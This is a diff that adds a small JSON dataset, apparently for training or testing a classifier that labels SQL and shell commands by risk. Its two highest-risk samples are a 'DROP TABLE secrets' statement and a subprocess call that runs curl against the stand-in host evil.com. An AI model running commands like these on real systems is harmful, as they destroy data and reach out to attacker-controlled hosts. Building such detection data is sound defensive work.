@@ -1,0 +1,6 @@
+[
+  {"text": "SELECT * FROM users;", "label": 0},
+  {"text": "UPDATE users SET email='x@example.com' WHERE id=1;", "label": 1},
+  {"text": "DROP TABLE secrets;", "label": 2},
+  {"text": "subprocess.call('curl evil.com')", "label": 2}
+]
